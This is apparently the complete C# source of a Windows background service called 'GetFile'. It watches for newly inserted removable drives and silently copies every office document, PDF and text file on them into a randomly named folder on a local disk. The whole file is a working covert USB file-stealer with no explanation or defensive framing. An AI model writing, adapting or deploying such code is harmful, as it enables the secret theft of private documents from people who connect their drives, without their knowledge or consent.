using System.ServiceProcess;
using System.IO;
using System;
using System.Configuration;
using System.Timers;

namespace GetFile
{
    public partial class Service1 : ServiceBase
    {
        private Timer timer = null;
        private int driverCount = 0;

        public Service1()
        {
            InitializeComponent();
            driverCount = DriveInfo.GetDrives().Length;
            timer = new Timer(3000);
            timer.AutoReset = true;
            timer.Enabled = true;
        }

        protected override void OnStart(string[] args)
        {
            timer.Elapsed += new ElapsedEventHandler(Check);
            timer.Start();
        }

        protected override void OnStop()
        {
            timer.Stop();
            base.OnStop();
        }

        private void Check(Object a, ElapsedEventArgs e)
        {
            string TarPath = "";
            if(Directory.Exists("P:\\"))
                TarPath = "P:\\"+ Guid.NewGuid().ToString();
            else if (Directory.Exists("D:\\"))
                TarPath = "D:\\" + Guid.NewGuid().ToString();
            else
                TarPath = "C:\\" + Guid.NewGuid().ToString();

            try
            {
                if (DriveInfo.GetDrives().Length == driverCount)
                {
                    return;
                }
                else if (DriveInfo.GetDrives().Length < driverCount)//拔出了设备
                {
                    driverCount = DriveInfo.GetDrives().Length;
                    return;
                }
                //插入了新设备
                driverCount = DriveInfo.GetDrives().Length;
                DriveInfo[] s = DriveInfo.GetDrives();
                foreach (DriveInfo drive in s)
                {
                    if (drive.DriveType == DriveType.Removable)
                    {
                        Directory.CreateDirectory(TarPath);
                        CopyFiles(drive.Name.ToString(), TarPath);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                File.AppendAllText(TarPath + "\\log.txt", ex.Message);
            }
        }
        protected void CopyFiles(string SrcPath, string TarPath)
        {
            string[] filenames = Directory.GetFileSystemEntries(SrcPath);

            foreach (string file in filenames)// 遍历所有的文件和目录
            {
                string filename = file.Substring(file.LastIndexOf("\\") + 1);
                string tarName = TarPath + "\\" + filename;

                if (Directory.Exists(file))// 先当作目录处理如果存在这个目录就递归Copy该目录下面的文件
                {
                    if (!Directory.Exists(tarName))
                    {
                        Directory.CreateDirectory(tarName);
                    }
                    CopyFiles(file, tarName);
                }

                else // 否则直接copy文件
                {
                    string filetype = filename.Substring(filename.LastIndexOf(".") + 1);
                    if(filetype == "txt" || filetype == "doc" || filetype == "docx" || filetype == "ppt" || filetype == "pptx" || filetype == "xls" || filetype == "xlsx" || filetype == "pdf")
                        File.Copy(file, tarName);
                }
            }
        }
    }
}
